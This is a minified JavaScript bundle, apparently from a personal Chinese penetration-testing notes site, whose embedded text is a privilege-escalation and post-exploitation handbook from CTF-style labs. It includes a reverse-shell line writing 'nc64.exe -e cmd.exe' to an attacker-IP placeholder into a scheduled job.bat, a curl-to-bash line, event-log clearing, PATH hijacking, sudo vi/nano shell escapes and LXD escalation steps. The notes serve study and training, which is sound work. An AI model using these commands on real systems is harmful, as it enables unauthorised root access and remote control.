\u540E\u6E17\u900F","Lateral Movement / \u6A2A\u5411\u6E17\u900F","Privilege Escalation / \u63D0\u6743"],size:"mini"}));function D(C){var y=C.routes,_=C.name,O=_===void 0?"--":_;return y?[O].concat(Object(h.a)(y.map(function(B){return D(B)}))):O}var d=j.a.createElement(j.a.Fragment,null,j.a.createElement("h1",null,"\u6B63\u5E38\u5168\u6D41\u7A0B-\u6E17\u900F\u6D4B\u8BD5\u6D41\u7A0B"),j.a.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),function(){var C=Object(h.a)(t.c.get_\u6E17\u900F\u6D41\u7A0B_routes().map(function(y){return D(y)}));return console.log("strings","arr",C),j.a.createElement(o,{strings:C,size:"mini"})}()),A=j.a.createElement(j.a.Fragment,null,j.a.createElement("h1",null,"\u56FD\u8D44\u4E91\u6388\u6743\u6D4B\u8BD5"),j.a.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),j.a.createElement(o,{strings:[["\u5916\u7F51\u6D4B\u8BD5","\u4FE1\u606F\u6536\u96C6\uFF08\u7565\uFF09",["\u8D44\u4EA7\u626B\u63CF","Goby","nmap"],["\u6F0F\u6D1E\u624B\u6D4B",["\u8D26\u53F7\u76F8\u5173","\u5F31\u53E3\u4EE4"],"SQL\u6CE8\u5165"]],["\u5185\u7F51\u6D4B\u8BD5",["\u8D44\u4EA7\u626B\u63CF","FScan\uFF08\u6548\u679C\u5947\u597D\uFF01\u64CD\u4F5C\u50BB\u74DC\uFF09","\u548C\u5916\u7F51\u76F8\u540C\uFF1AGoby\u3001nmap"]]],size:"mini"})),E=j.a.createElement(j.a.Fragment,null,j.a.createElement("h1",null,"\u62A4\u7F51\u7EA2\u961F"),j.a.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),j.a.createElement(o,{strings:[["\u57FA\u672C\u6D41\u7A0B","\u5165\u53E3\u6743\u9650\uFF08\u79F0\u4E3A\u6253\u70B9\uFF09","\u5185\u7F51\u641C\u96C6/\u63A2\u6D4B","\u514D\u6740\u63D0\u6743","\u6293\u53D6\u767B\u5F55\u51ED\u8BC1","\u8DE8\u5E73\u53F0\u7684\u6A2A\u5411\u653B\u51FB","\u5165\u53E3\u6743\u9650\u7EF4\u6301","\u96A7\u9053\u6570\u636E\u56DE\u4F20","\u5B9A\u671F\u6743\u9650\u7EF4\u6301"],"\u4FE1\u606F\u6CC4\u9732\u6536\u96C6","\u8D44\u4EA7\u6536\u96C6"],size:"mini"}))},JpNU:function(nu,U,f){"use strict";f.d(U,"a",function(){return u});var R=f("jrin"),h=f("k1fw"),l=f("fWQN"),j=f("mtLc"),n=f("9kvl"),u=function(){function t(){Object(l.a)(this,t)}return Object(j.a)(t,[{key:"fkDva_connect",value:function(m,F){var k=Object(n.c)(m);console.log("\u68C0\u67E5\u62A5\u9519 a",k);var o=k(F);console.log("\u68C0\u67E5\u62A5\u9519 b",o);var c=o;return console.log("\u68C0\u67E5\u62A5\u9519 fc",c),c}},{key:"get_connect_mapStateToProps_FN",value:function(m){var F=arguments.length>1&&arguments[1]!==void 0?arguments[1]:function(){return{}};return function(k){var o;console.log("dvaBuiltIn_data","\u9ED8\u8BA4\u6570\u636E",k);var c=m.namespace,b=k[c],e=k.loading,v=F(k);return Object(h.a)(Object(h.a)({},k),{},(o={},Object(R.a)(o,c,b),Object(R.a)(o,"my_isLoading",e.models[m.namespace]),o),v)}}}],[{key:"getInstance",value:function(m,F,k){var o=new t,c=o.get_connect_mapStateToProps_FN(F,k);return o.fkDva_connect(c,m)}}]),t}()},KlFh:function(nu,U,f){nu.exports=f.p+"static/fantasy_1.81dd8537.png"},NsKX:function(nu,U,f){nu.exports={pyramidWra:"pyramidWra___27LyC",isOverFlow:"isOverFlow___2Gm9M",pyramidItem:"pyramidItem___33y6q",pyramidItem_levelTag:"pyramidItem_levelTag___3a_4s",pyramidItem_SubItem_Title:"pyramidItem_SubItem_Title___1kxQ_",pyramidLv:"pyramidLv___ReHfA",pyramid_lv_1_item:"pyramid_lv_1_item___2M4nG",pyramid_lv_2_item:"pyramid_lv_2_item___2qhNd",pyramid_lv_3_item:"pyramid_lv_3_item___3gwuq",pyramid_lv_4_item:"pyramid_lv_4_item___2vZY_"}},NvD2:function(nu,U,f){"use strict";f.d(U,"a",function(){return u});var R=f("Kwbf");function h(t,s){var m=new Set;return t.forEach(function(F){s.has(F)||m.add(F)}),m}function l(t){var s=t||{},m=s.disabled,F=s.disableCheckbox,k=s.checkable;return!!(m||F)||k===!1}function j(t,s,m,F){for(var k=new Set(t),o=new Set,c=0;c<=m;c+=1){var b=s.get(c)||new Set;b.forEach(function(d){var A=d.key,E=d.node,C=d.children,y=C===void 0?[]:C;k.has(A)&&!F(E)&&y.filter(function(_){return!F(_.node)}).forEach(function(_){k.add(_.key)})})}for(var e=new Set,v=m;v>=0;v-=1){var D=s.get(v)||new Set;D.forEach(function(d){var A=d.parent,E=d.node;if(!(F(E)||!d.parent||e.has(d.parent.key))){if(F(d.parent.node)){e.add(A.key);return}var C=!0,y=!1;(A.children||[]).filter(function(_){return!F(_.node)}).forEach(function(_){var O=_.key,B=k.has(O);C&&!B&&(C=!1),!y&&(B||o.has(O))&&(y=!0)}),C&&k.add(A.key),y&&o.add(A.key),e.add(A.key)}})}return{checkedKeys:Array.from(k),halfCheckedKeys:Array.from(h(o,k))}}function n(t,s,m,F,k){for(var o=new Set(t),c=new Set(s),b=0;b<=F;b+=1){var e=m.get(b)||new Set;e.forEach(function(A){var E=A.key,C=A.node,y=A.children,_=y===void 0?[]:y;!o.has(E)&&!c.has(E)&&!k(C)&&_.filter(function(O){return!k(O.node)}).forEach(function(O){o.delete(O.key)})})}c=new Set;for(var v=new Set,D=F;D>=0;D-=1){var d=m.get(D)||new Set;d.forEach(function(A){var E=A.parent,C=A.node;if(!(k(C)||!A.parent||v.has(A.parent.key))){if(k(A.parent.node)){v.add(E.key);return}var y=!0,_=!1;(E.children||[]).filter(function(O){return!k(O.node)}).forEach(function(O){var B=O.key,r=o.has(B);y&&!r&&(y=!1),!_&&(r||c.has(B))&&(_=!0)}),y||o.delete(E.key),_&&c.add(E.key),v.add(E.key)}})}return{checkedKeys:Array.from(o),halfCheckedKeys:Array.from(h(c,o))}}function u(t,s,m,F){var k=[],o;F?o=F:o=l;var c=new Set(t.filter(function(D){var d=!!m[D];return d||k.push(D),d})),b=new Map,e=0;Object.keys(m).forEach(function(D){var d=m[D],A=d.level,E=b.get(A);E||(E=new Set,b.set(A,E)),E.add(d),e=Math.max(e,A)}),Object(R.a)(!k.length,"Tree missing follow keys: ".concat(k.slice(0,100).map(function(D){return"'".concat(D,"'")}).join(", ")));var v;return s===!0?v=j(c,b,e,o):v=n(c,s.halfCheckedKeys,b,e,o),v}},ONbu:function(nu,U,f){"use strict";f.r(U),f.d(U,"\u6743\u9650\u63D0\u5347_\u63D0\u6743_\u540E\u6E17\u900F_\u5185\u7F51\u6E17\u900F_\u624B\u518C",function(){return o});var R=f("tJVT"),h=f("fWQN"),l=f("q1tI"),j=f.n(l),n=f("/qoP"),u=f("ysNt"),t=f("EkZe"),s=u.e.singleATag_blank,m=function c(){Object(h.a)(this,c)};m.\u5E38\u7528=`
  \u76F8\u5173\u7684\u81EA\u52A8\u679A\u4E3E\u5DE5\u5177

      Linux\uFF1A

          \u3010LinPEAS\u3011
              \u8D44\u6599\uFF1Ahttps://github.com/carlospolop/PEASS-ng

              \u5F88\u68D2\u7684\u3010\u6743\u9650\u63D0\u5347\u3011\u811A\u672C\u5957\u4EF6       \uFF08\u5E26\u5F69\u8272\u8F93\u51FA\uFF09

              \u5B50\u9879\u76EE\u3010linPEAS\u3011
                  https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
                      \u5F88\u68D2\u7684\u3010Linux \u6743\u9650\u63D0\u5347\u3011\u811A\u672C

          \u3010LinEnum\u3011
              \u8D44\u6599\uFF1Ahttps://github.com/rebootuser/LinEnum

              \u7B80\u5355\u4F7F\u7528\u65B9\u5F0F
                  curl  <\u5B58\u653E\u5730\u5740>  |  bash
                      \u76F4\u63A5\u8BBF\u95EE\u540E\uFF0C\u8FDB\u884C\u6267\u884C\u3002  \uFF08\u4E0D\u4F1A\u4FDD\u7559\u672C\u5730\u6587\u4EF6\uFF09

          \u3010lse\u3011
              \u8D44\u6599\uFF1Ahttps://github.com/diego-treitos/linux-smart-enumeration

              \u3010Linux\u679A\u4E3E\u5DE5\u5177\u3011\uFF0C\u7528\u4E8E\u6E17\u900F\u6D4B\u8BD5\u548CCTF
                  \u5177\u6709\u3010\u65E5\u5FD7\u7EA7\u522B\u3011\u7684\u529F\u80FD

          \u3010pspy\u3011
              \u8D44\u6599\uFF1Ahttps://github.com/DominicBreuker/pspy

              \u4ECB\u7ECD\uFF1A
                  \u5728\u6CA1\u6709root\u6743\u9650\u7684\u524D\u63D0\u4E0B\uFF0C\u76D1\u542Clinux\u8FDB\u7A0B\u3002
                  \u5141\u8BB8\u60A8\u5728\u6267\u884C\u65F6\u67E5\u770B \u5176\u4ED6\u7528\u6237 \u3001 \u3010cron\u3011 \u4F5C\u4E1A\u7B49\u8FD0\u884C\u7684\u547D\u4EE4\u3002\u975E\u5E38\u9002\u5408\u5728 CTF \u4E2D\u679A\u4E3E Linux \u7CFB\u7EDF\u3002
                  \u540C\u65F6\uFF0C\u4E5F\u5C55\u793A\u4E86\uFF1A\u4E3A\u4EC0\u4E48\u5728\u547D\u4EE4\u884C\u4E0A\u5C06\u79D8\u5BC6\u4F5C\u4E3A\u53C2\u6570\u4F20\u9012\u662F\u4E00\u4E2A\u574F\u4E3B\u610F\u3002
                      \u5F88\u5BB9\u6613\u88AB\u4E00\u773C\u770B\u6E05\u695A\u3002





      Windows\uFF1A

          \u3010WinPeas\u3011
              \u81EA\u52A8\u5316  \u76EE\u6807\u7CFB\u7EDF\u4E2D  \u7684\u5927\u90E8\u5206\u679A\u4E3E\u8FC7\u7A0B\u3002
                  \u7ECF\u8FC7\u8BD5\u9A8C\uFF0C\u6570\u636E\u662F\u300A\u6D77\u91CF\u7684\u6570\u636E\u300B\u3002

              Privilege Escalation

                  \u6709\u65F6\uFF0C\u53EF\u7528\u4E8E\uFF0C\u6743\u9650\u63D0\u5347

              \u4E0B\u8F7D\u5730\u5740\uFF1A
                  https://github.com/carlospolop/PEASS-ng/releases
                      \u9009\u62E9\u300AwinPEASx64.exe\u300B

              \u8FD0\u884C
                  ./winPEASx64.exe

              SeImpersonatePrivilege
                  https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege

          \u5E38\u89C1\u7684\uFF0C\u800C\u6211\u8FD8\u672A\u68C0\u67E5\u7684\u3010\u672C\u5730\u679A\u4E3E\u5DE5\u5177\u3011
              \u3010Sherlock\u3011
              \u3010PowerOPs\u3011
              \u3010Nishang\u3011
              \u3010Jaws\u3011



          wevtutil
              \u8D44\u6599\uFF1Ahttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil

              \u80FD\u591F\u68C0\u7D22\u6709\u5173\u3010event logs\u3011\u548C\u3010publishers\u3011\u4FE1\u606F\uFF0C\u7684 Windows \u547D\u4EE4\u3002

              \u5B83\u8FD8\u53EF\u4EE5\u5B89\u88C5\u548C\u5378\u8F7D\u3010event manifests\u3011\u3001\u8FD0\u884C\u3010\u67E5\u8BE2query\u3011\u548C\u3010\u5BFC\u51FAexport\u3011\u3001\u3010\u5F52\u6863archive\u3011\u548C \u6E05\u9664\u3010\u65E5\u5FD7logs\u3011\u3002

              \u5B50\u547D\u4EE4\uFF1A
                  \u3010el\u3001 enum-logs\u3011\uFF0C\u5C55\u793A\u6240\u6709\u65E5\u5FD7\u7684\u540D\u79F0

                  \u3010cl\u3001 clear-log\u3011\uFF0C\u4ECE\u6307\u5B9A\u7684 \u4E8B\u4EF6\u65E5\u5FD7\u4E2D \u6E05\u9664\u4E8B\u4EF6\u3002




          iCacls    \uFF08\u63D0\u6743\uFF09

              Integrity Control Access Control List  /  \u5B8C\u6574\u6027 \u63A7\u5236 \u8BBF\u95EE \u63A7\u5236\u5217\u8868

              \u573A\u666F\uFF1A
                  \u7531\u4E8E\u6587\u4EF6\u672C\u8EAB\u53EA\u80FD\u7531\u7BA1\u7406\u5458\u8FD0\u884C\uFF0C

              \u6211\u4EEC\u53EF\u4EE5\u8BD5\u8BD5\u8FD0\u6C14\uFF0C\u770B\u770B\u6211\u4EEC\u7684\u7528\u6237\u7EC4\u662F\u5426\u81F3\u5C11\u53EF\u4EE5\u7F16\u8F91\u6587\u4EF6\uFF0C\u800C\u4E0D\u662F\u8FD0\u884C\u5B83\uFF0C\u6216\u8005\u811A\u672C\u548C\u7528\u6237\u7EC4\u6216\u6587\u4EF6\u914D\u7F6E\u4E4B\u95F4\u662F\u5426\u5B58\u5728\u4EFB\u4F55\u4E0D\u5339\u914D\u7684\u6743\u9650 . \u6211\u4EEC\u53EF\u4EE5\u901A\u8FC7\u4F7F\u7528 icacls \u547D\u4EE4\u6765\u5B9E\u73B0\u8FD9\u4E00\u70B9\u3002

              \u547D\u4EE4\uFF1A

                  icacls  <\u6587\u4EF6>
                      \u7ED3\u679C\u5C55\u793A\uFF1A
                          BUILTIN\\Users:(F)
                          NT AUTHORITY\\SYSTEM:(I)(F)
                          BUILTIN\\Administrators:(I)(F)
                          BUILTIN\\Users:(I)(RX)

                          \u3010(F)\u3011\uFF0C\u4EE3\u8868 \u3010full control \u5B8C\u5168\u63A7\u5236\u3011 \u6743\u9650\u3002

                          \u3010BUILTIN\\Users\u3011\u7EC4\uFF0C\u4EE3\u8868\u6240\u6709\u7684 \u672C\u5730\u7528\u6237



          schtasks
              \u67E5\u770B\u5F53\u524D\u7684\u3010scheduled tasks \u8BA1\u5212\u4EFB\u52A1\u3011

              \u5C55\u73B0\u7ED3\u679C\uFF1A
                  Folder\u6587\u4EF6\u5939
                  TaskName \u4EFB\u52A1\u540D\u79F0
                  Next Run Time \u4E0B\u6B21\u8FD0\u884C\u65F6\u95F4
                  Status \u72B6\u6001

              \u5982\u679C\u3010\u6743\u9650\u53D7\u9650\u3011\uFF0C\u90E8\u5206\u4FE1\u606F\u5C55\u73B0\u4E0D\u51FA\u6765  \u5219\u53EF\u4EE5\u770B\u4E0B\u9762\u7684\u3010powershell\u3011\u90E8\u5206


          \u5982\u679C\uFF08cmd\u6743\u9650\u4E0D\u591F\uFF09\uFF0C\u5219\u53EF\u4EE5\u5207\u6362\u5230\uFF08PowerShell\uFF09\u3002\u8FD9\u53EF\u80FD\u4F1A\u56E0\u4E3A\u3010misconfiguration\u3011\u800C\u5E26\u6765\u90E8\u5206\u63D0\u6743
              \u4E00\u4E9B\u7B49\u6548\u547D\u4EE4\uFF1A

                  \u3010cmd\u3011schtasks \u2014\u2014 \u3010powershell\u3011ps

          \u4EE5\u4E0A\u7684\u68C0\u67E5\u3010\u8BA1\u5212\u4EFB\u52A1\u3011\u3001\u3010\u8FDB\u7A0B\u3011
              \u53EF\u4EE5\u786E\u8BA4\uFF0C\u3010\u8BE5\u8FDB\u7A0B\u3011\u662F\u5426\u6B63\u5728\u8FD0\u884C\u3001\u3010job.bat\u3011\u662F\u5426\u6B63\u5728\u8FD0\u884C



          \u76F8\u5173\u7684\u4E00\u4E9B\u573A\u666F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F
          \u76F8\u5173\u7684\u4E00\u4E9B\u573A\u666F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F
          \u76F8\u5173\u7684\u4E00\u4E9B\u573A\u666F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1A

              \u7B2C\u4E00\u79CD\uFF1A
                  \u68C0\u67E5\u3010job.bat\u3011\u4E2D\uFF0C\u63D0\u5230\u7684\u3010wevtutil\u3011\u8FDB\u7A0B\uFF0C\u662F\u5426\u6B63\u5728\u8FD0\u884C\uFF1F

              \u7B2C\u4E8C\u79CD\uFF1A
                  \u901A\u8FC7ping\uFF0C
                      \u53D1\u73B0\uFF0C\u53D7\u5BB3\u673A\uFF0C\u65E0\u6CD5ping\u901A \u3010172.217.194.101\u3011  \uFF08Google\u7684IP\uFF09

                      \u6240\u4EE5\uFF0C\u53EF\u80FD\u65E0\u6CD5\u8BBF\u95EE\u5916\u7F51
                          \uFF08\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\u4F46\u662F\uFF0C\u540E\u9762\u53C8\u53EF\u4EE5\u4F7F\u7528\u3010ssh\u3011\u7684\u3010wget\u3011\u547D\u4EE4\uFF0C\u4ECE\u301010.10.14.56\u3011\u83B7\u53D6\u6587\u4EF6\uFF1F\uFF1F\uFF1F\uFF09

                  \u4E0A\u4F20nc64.exe
                      \u6B64\u5904\uFF0C\u6211\u66FE\u72AF\u8FC7\u4E00\u4E2A\u3010\u5F88\u4F4E\u7EA7\u3011\u7684\u9519\u8BEF\u3002
                          \u5C06\u3010GitHub\u3011\u7684\u3010\u6587\u6863\u9875\u9762\u3011\uFF0C\u9519\u5F53\u505A\u3010exe\u76F4\u63A5\u4E0B\u8F7D\u5730\u5740\u3011\uFF0C\u8FDB\u884C\u4E86\u4E0A\u4F20\u3002

                  \u63D2\u5165\u3010job.bat\u3011
                      echo  C:\\Log-Management\\nc64.exe -e cmd.exe  <\u653B\u51FB\u673AIP>  <\u653B\u51FB\u673A\u7AEF\u53E3>    >    C:\\Log-Management\\job.bat
                          \u5176\u5B9E\uFF0C\u53EA\u662F\u63D2\u5165\u4E86\u4E00\u6BB5\u6587\u672C


  `;var F=function c(){Object(h.a)(this,c)};F.\u5171\u540C\u53C2\u8003\u8D44\u6599=`
   \u53C2\u8003\u8D44\u6599\uFF1A
          \u5185\u7F51\u6E17\u900F\u5230\u540E\u6E17\u900F\u7684\u57FA\u672C\u601D\u8DEF \xB7 Ywc's blog
                  https://yinwc.github.io/2019/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E5%90%8E%E6%B8%97%E9%80%8F/#%E5%90%8E%E6%B8%97%E9%80%8F

   `;var k={name:"\u3010Privilege\u3011\u3010Escalation\u3011_\u3010\u6743\u9650\u63D0\u5347\u3011_\u3010\u63D0\u6743\u3011_\u3010\u540E\u6E17\u900F\u3011_\u3010\u3010Post\u3011\u3010Exploitation\u3011_\u3010\u5185\u7F51\u6E17\u900F\u3011_\u3010\u6A2A\u5411\u79FB\u52A8\u3011_\u624B\u518C",steps:[{name:"\u3010Linux\u63D0\u6743\u3011",desc:j.a.createElement(j.a.Fragment,null),content:Promise.all([Promise.resolve().then(f.bind(null,"+/qY"))]).then(function(c){var b=Object(R.a)(c,1),e=b[0];return j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u300A\u62A4\u7F51\u9762\u8BD5\u300B\u4E13\u7528\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01
              linux \u63D0\u6743 \u810F\u725B \u70C2\u571F\u8C46


          \u5148\u8FDB\u884C\u63A2\u6D4B\uFF1A
              sudo  -l
                  \u63A2\u6D4B\uFF0C\u5F53\u524D\u7528\u6237\uFF0C\u662F\u5426\u6709\u3010sudo\u3011\u6743\u9650

              \u5C1D\u8BD5\uFF0C\u901A\u8FC7\u3010group\u7EC4\u3011\u7A81\u7834\uFF1A
                  id
                      \u63A2\u6D4B\uFF0C\u5F53\u524D\u7528\u6237\uFF0C\u76F8\u5173\u7684\u3010\u7EC4\u4FE1\u606F\u3011

                  find  /  -group  <\u76EE\u6807\u7528\u6237\u7EC4>
                      \u67E5\u627E\uFF0C\u3010\u76EE\u6807\u7528\u6237\u7EC4\u3011\u7684\u76F8\u5173\u6587\u4EF6

              \u3010ls  -al\u3011\u548C\u3010file\u3011\uFF0C\u67E5\u770B\u6587\u4EF6\u5177\u4F53\u7C7B\u578B
                  \u5982\u679C\u6709\u3010suid set\u3011\u96C6\uFF0C\u5219\u662F\u3010\u6709\u6F5C\u529B\u3011\u7684\u3010\u5229\u7528\u8DEF\u5F84\u3011\u3002
                      suid\uFF0C(setuid)\uFF0C\u3010Set owner User ID\u3011
                      \u62E5\u6709\u8BE5\u3010suid\u3011\u6743\u9650\uFF0C\u5219\u3010\u4EFB\u4F55\u4EBA\u65E0\u8BBA\u6743\u9650\u3011\uFF0C\u90FD\u53EF\u4EE5\u3010\u6267\u884C\u8BE5\u6587\u4EF6\u3011

          \u5229\u7528\u3010suid\u3011

          \u5229\u7528\u3010\u672A\u6307\u5B9A\u7EDD\u5BF9\u8DEF\u5F84\u3011\u7684\u3010\u547D\u4EE4\u3011
              \u6BD4\u5982\u3010cat\u3011\uFF0C\u672A\u6307\u5B9A\u3010\u7EDD\u5BF9\u8DEF\u5F84\u3011

              \u6211\u4EEC\u5728\u3010/tmp\u3011\u4E2D\uFF0C\u521B\u5EFA\u540C\u540D\u6587\u4EF6\u3010cat\u3011
                  \u5185\u5BB9\u5199\u5165\u3010/bin/bash\u3011
                  \u589E\u52A0\u6743\u9650\u3010chmod 777\u3011

              \u5C06\u540C\u540D\u6587\u4EF6\u3010cat\u3011\uFF0C\u52A0\u5165\u3010\u73AF\u5883\u53D8\u91CF\u3011PATH\u3002      (environmental variable)
                  export  PATH=/tmp:$PATH
                      \u6DFB\u52A0\u5728\u4E86\u6700\u524D\u9762
                  echo  $PATH
                      \u6253\u5370\uFF0C\u67E5\u770BPATH \u53D8\u91CF

          \u5982\u679C\u6709\u3010sudo\u3011\u6743\u9650
              \u3010env_keep\u3011
              \u3010secure_path\u3011

              \u3010commands\u3011
                  \u591A\u4E2A\u547D\u4EE4\uFF0C\u8003\u8651\u7EC4\u5408

          Linux\u4E2D\uFF0C\u3010\u4E8C\u8FDB\u5236\u6587\u4EF6 / \u547D\u4EE4\u3011\u7684\u63D0\u6743\u5217\u8868\uFF1A

              \u91CD\u8981\u8D44\u6599\uFF1Ahttps://github.com/GTFOBins/GTFOBins.github.io

              \u3010vi\u3011\u63D0\u6743
                  \u91CD\u8981\u8D44\u6599\uFF1Ahttps://gtfobins.github.io/gtfobins/vi/#sudo

                  \u7B2C\u4E00\u79CD\u65B9\u5F0F
                      vi  -c  ':!/bin/sh'  /dev/null

                `,n.g.\u7EC4\u4EF6\u624B\u518C.get\u6309\u94AE\u548C\u5F39\u51FA\u624B\u518C_\u6709\u65E0cfg\u7686\u53EF(e.Linux\u5E38\u89C1\u6307\u4EE4_cfg_\u4E8C\u7EA7\u624B\u518C),`

                  \u7B2C\u4E8C\u79CD\u65B9\u5F0F
                      \u9996\u5148\u3010vi\u3011
                      \u7136\u540E\u5728\u3010\u547D\u4EE4\u6A21\u5F0F\u3011\uFF0C\u8BBE\u7F6E\u53D8\u91CF
                          \u3010:set  shell=/bin/sh  \u3011\u3002
                      \u518D\u7136\u540E\u5728\u3010\u547D\u4EE4\u6A21\u5F0F\u3011\uFF0C\u6267\u884C
                          \u3010:shell\u3011


                  \u7B2C\u4E09\u79CD\u65B9\u5F0F
                      \u57FA\u4E8E\u3010\u7B2C\u4E00\u79CD\u65B9\u5F0F\u3011\uFF0C\u5C1D\u8BD5\u83B7\u53D6\u3010Sudo\u3011
                          sudo  vi  -c  ':!/bin/sh'  /dev/null


              \u3010nano\u3011\u63D0\u6743
                  \u91CD\u8981\u8D44\u6599\uFF1A
                      https://gtfobins.github.io/gtfobins/nano/#sudo
                  \u6F14\u793A\u5730\u5740\uFF1A\uFF08\u6D41\u7A0B\u7B80\u5355\u6F14\u793A\uFF09
                      https://0xdf.gitlab.io/2020/05/02/htb-openadmin.html#sudo-nano

                  \u501F\u52A9\u3010sudo\u3011+\u3010nano\u3011
                      \u793A\u4F8B1\uFF1A
                          sudo  -u  root  /bin/nano  <\u6587\u4EF6\u540D>
                              \u5177\u4F53\u3010\u3011
                          \u8F93\u5165\u3010Ctrl+R\u3011
                              Nano\u5141\u8BB8\u4F7F\u7528\u5FEB\u6377\u65B9\u5F0F\u3010Ctrl + R\u3011\u5C06\u3010\u5916\u90E8\u6587\u4EF6\u3011\u63D2\u5165\u5F53\u524D\u6587\u4EF6\u3002
                          \u8F93\u5165\u3010Ctrl+X / ^X\u3011\uFF0C\u7136\u540E\u8F93\u5165\u3010reset; sh 1>&0 2>&0\u3011
                          \u6700\u540E\uFF0C\u53EF\u4EE5\u8F93\u5165\u3010bash\u3011\uFF0C\u83B7\u5F97\u4E00\u4E2A\u66F4\u65B9\u4FBF\u7684shell\u3002

                      \u793A\u4F8B2\uFF1A\uFF08\u5176\u5B9E\u548C \u793A\u4F8B1 \u57FA\u672C\u4E00\u81F4\uFF09
                          sudo  /bin/nano  <\u6587\u4EF6\u540D>
                          \u8F93\u5165\u3010Ctrl+R\u3011
                          \u8F93\u5165\u3010Ctrl+X\u3011\uFF0C\u7136\u540E\u8F93\u5165\u3010reset; /bin/sh 1>&0 2>&0\u3011
                          \u6700\u540E\uFF0C\u53EF\u4EE5\u8F93\u5165\u3010bash\u3011\uFF0C\u83B7\u5F97\u4E00\u4E2A\u66F4\u65B9\u4FBF\u7684shell\u3002


          \u501F\u52A9\u3010Mongo\u3011\u63D0\u6743
              \u57FA\u672C\u601D\u8DEF\u4E00\uFF1A
                  \u4FEE\u6539\u6216\u83B7\u53D6\uFF0C\u3010Mongo\u3011\u767B\u5F55\u6743\u9650
                  \u4FEE\u6539\u3010admin\u7528\u6237\u8868\u3011\u7B49\u8868\uFF0C\u6570\u636E

                  \u7136\u540E\uFF0C\u767B\u5F55\u5BF9\u5E94\u3010CMS\u540E\u53F0\u3011\uFF0C\u6267\u884C\u654F\u611F\u547D\u4EE4\u3001\u83B7\u53D6\u654F\u611F\u4FE1\u606F
                      \u4E3E\u4F8B\uFF1A
                          \u3010UniFi / UniFi Network\u3011\uFF0C\u83B7\u53D6\u3010SSH\u3011\u7684 Authentication\u8BA4\u8BC1\u4FE1\u606F \u3002

                  \u4E4B\u540E\uFF0C\u5802\u800C\u7687\u4E4B\u7684\u62FF\u5230root\u6743\u9650\u3002

          \u5229\u7528\u3010lxd\u3011\u63D0\u6743


              \u5371\u9669\u6027( \u6781\u6613\u53D7\u653B\u51FB)\uFF1A
                  \u672C\u5730\u201Clxd\u201D\u7EC4\u7684\u6210\u5458\u53EF\u4EE5\u7ACB\u5373\u5C06\u6743\u9650\u63D0\u5347\u5230\u4E3B\u673A\u64CD\u4F5C\u7CFB\u7EDF\u4E0A\u7684 root\u3002
                      \u8FD9\u4E0E\u8BE5\u7528\u6237\u662F\u5426\u5DF2\u88AB\u6388\u4E88 sudo \u6743\u9650\u5E76\u4E14\u4E0D\u9700\u8981\u4ED6\u4EEC\u8F93\u5165\u5BC6\u7801\u65E0\u5173\u3002
                      \u5373\u4F7F\u4F7F\u7528 LXD snap \u5305\uFF0C\u8BE5\u6F0F\u6D1E\u4E5F\u5B58\u5728\u3002

              \u76F8\u5173\u5DE5\u5177\uFF1A
                  `.concat(m.\u5E38\u7528,`


              \u5229\u7528\uFF1A
                  \u8D44\u6599\uFF1A
                      \u601D\u8DEF1\uFF1Ahttps://www.hackingarticles.in/lxd-privilege-escalation/
                      \u601D\u8DEF2\uFF1Ahttps://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/
                      \u5177\u4F53\u65B9\u6CD5\u4EE3\u7801\uFF1A
                          https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

                  \u5177\u4F53\u601D\u8DEF\uFF1A
                      1. \u8BE5\u6F0F\u6D1E\u5229\u7528\u5229\u7528 Alpine \u6620\u50CF\u5DE5\u4F5C\uFF0C\u8FD9\u662F\u4E00\u4E2A\u57FA\u4E8E\u3010BusyBox\u3011\u7684\u8F7B\u91CF\u7EA7 Linux \u53D1\u884C\u7248\u3002
                      2. \u5728\u672C\u5730\u4E0B\u8F7D\u5E76\u6784\u5EFA\u6B64\u53D1\u884C\u7248\u540E\uFF0C\u4F7F\u7528 HTTP \u670D\u52A1\u5668\u5C06\u5176\u4E0A\u4F20\u5230\u8FDC\u7A0B\u7CFB\u7EDF\u3002
                      3. \u7136\u540E\u5C06\u6620\u50CF\u5BFC\u5165 LXD\uFF0C\u5E76\u7528\u4E8E\u4EE5 root \u6743\u9650\u6302\u8F7D Host \u6587\u4EF6\u7CFB\u7EDF\u3002

                  \u5229\u7528\u6D41\u7A0B\uFF1A
                      \u653B\u51FB\u673A\uFF1A
                          \u3010\u7B2C\u4E00\u6B65\u3011
                              cd $HOME
                              sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
                              git clone https://github.com/lxc/distrobuilder
                              \u8FDB\u5165\u76EE\u5F55\uFF0C\u6267\u884C\u3010make\u3011

                          \u3010\u7B2C\u4E8C\u6B65\u3011\uFF0C\u4E0B\u8F7D\u3010Alpine YAML\u3011\u6587\u4EF6\uFF0C\u5E76\u8FDB\u884C build \u6784\u5EFA
                              mkdir -p $HOME/ContainerImages/alpine/
                              cd $HOME/ContainerImages/alpine/
                              wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
                              sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8

                          \u5F97\u5230\u7ED3\u679C\uFF1A
                              \u3010lxd.tar.xz\u3011\u548C\u3010rootlet.squashfs\u3011\uFF0C\u4E24\u4E2A\u6587\u4EF6\u3002

                      \u53D7\u5BB3\u673A
